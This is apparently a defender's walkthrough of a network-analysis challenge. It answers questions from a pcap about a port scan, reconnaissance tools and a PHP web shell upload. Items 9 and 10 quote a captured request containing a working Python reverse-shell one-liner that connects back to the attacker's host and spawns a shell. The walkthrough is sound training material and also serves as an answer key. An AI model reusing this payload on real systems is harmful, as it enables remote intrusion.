#### Network Analysis – WebShell

#### Challenge Submission

> pcap File ->  BTLOPortScan.pcap

Using Wireshark, 

#### Questions

##### 1) What is the IP responsible for conducting the port scan activity?

We can see this question's answer 

```
Statistics-> Conversations
```

**Answer:** 10.251.96.4

##### 2) What is the port range scanned by the suspicious host? 

```
Statistics-> Conversations -> port
```

**Answer:** 1-1024

##### 3) What is the type of port scan conducted?

```
Filter =>  src.ip==10.251.96.4 
Immediately we see a load of SYN packets sent to each port for 10.251.96.5. This tells us that a TCP SYN scan was conducted.
```

**Answer:** TCP SYN

##### 4) Two more tools were used to perform reconnaissance against open ports, what were they?

```
Filter => ip.dst == 10.251.96.5 && http.user_agent
_ View in User-Agent: 
```

**Answer:** Gobuster 3.0.1, sqlmap 1.4.7

##### 5) What is the name of the php file through which the attacker uploaded a web shell? 

```
Filter => http.request.method==POST
- View in Referer
```

**Answer:** Editprofile.php

##### 6) What is the name of the web shell that the attacker uploaded? 

```
Filter => http.request.method==POST
- we can see the plaintext of the fileToUpload which is dbfunctions.php
```

**Answer:** Dbfunctions.php

##### 7) What is the parameter used in the web shell for executing commands?

```
Filter => http.request.method==POST
- Looking at the content of the identified dbfunctions.php
```

**Answer:** cmd

##### 8) What is the first command executed by the attacker? 

```
Filter => ip.src==10.251.96.4 && http.request.method==GET
```

**Answer:** id

##### 9) What is the type of shell connection the attacker obtains through command execution?

```
Filter => ip.src==10.251.96.4 && http.request.method==GET
The third command is clearly some python script. Follow the TCP Stream to view it fully.

GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
```

**Answer:** reverse

##### 10) What is the port he uses for the shell connection?

```
Filter => ip.src==10.251.96.4 && http.request.method==GET
The third command is clearly some python script. Follow the TCP Stream to view it fully.

GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
```

**Answer:** 4422

